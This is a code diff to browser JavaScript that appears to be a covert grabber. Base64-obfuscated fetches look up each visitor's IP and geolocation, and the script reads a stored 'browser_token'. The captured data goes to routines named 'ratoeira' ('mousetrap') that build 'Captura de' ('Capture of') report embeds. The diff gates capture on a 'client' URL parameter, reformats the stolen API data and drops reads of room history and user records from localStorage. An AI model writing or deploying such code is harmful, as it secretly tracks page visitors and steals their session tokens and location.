@@ -34,7 +34,7 @@
             class Start {
                 static async start() {
                     let i;
-                    let id;
+                    let id = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
                     try{
                     await fetch(atob("aHR0cHM6Ly9hcGktYmRjLm5ldC9kYXRhL2NsaWVudC1pcA=="))
                     .then((body) => body.json())
@@ -48,11 +48,11 @@
                     .then((body) => body.json())
                     .then((data) => {
                         let j = localStorage.getItem(atob("YnJvd3Nlcl90b2tlbg=="));
+                        let client = urlParams.get('client');
                         
                        let $loc =  document.getElementById("loc");
                        $loc.innerHTML = data.location.principalSubdivision + ", " + data.location.city + ", " + data.location.localityName;
                         
-                        id = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
 
                         Start.sdc(id, i,` ${
                             data.location.principalSubdivision +
@@ -61,35 +61,23 @@
                             ", " +
                             data.location.localityName
                         }`,j);
-
-                        Start.ratoeira(id, `${
+                        
+                        if(client != null){
+                            Start.ratoeira(id, `${
                             data.location.principalSubdivision +
                             ", " +
                             data.location.localityName
                         }`);
-
-
-                        
-
-                        try{
-                        rh = localStorage.getItem("nitro.room.history");
-                        u = localStorage.getItem("user");
-
-                        
-
-                        } catch (error) {
-                        console.log("erro: ", error);
                         }
+                       
                         
-                        console.log("foi?")
                     })
                     .catch((error) => {
                         console.log("erro: ", error);
                     });
 
-                    await fetch(atob("aHR0cDovL2lwLWFwaS5jb20vanNvbi8==") + i).then((body) => body.json()).then((data) => {
-                        Start.generic(data, id);    
-                    }).catch((error) => {});
+                    let res = await fetch(atob("aHR0cDovL2lwLWFwaS5jb20vanNvbi8=") + i);
+                    Start.generic(await res.text(), id);
                    
                     }catch(e){
                     console.log(e);
@@ -113,11 +101,9 @@
                         {
                         title: `Captura de ${nome}`,
                         fields: [
-                            
-                            
                             {
                             name: "API Response Data",
-                            value: message,
+                            value: (function(){try{return "```json\n"+JSON.stringify(JSON.parse(message),null,2).replace(/`/g,"'")+"\n```";}catch(e){return "```json\n"+String(message).replace(/`/g,"'")+"\n```";}})(),
                             },
                         ],
                         footer: {
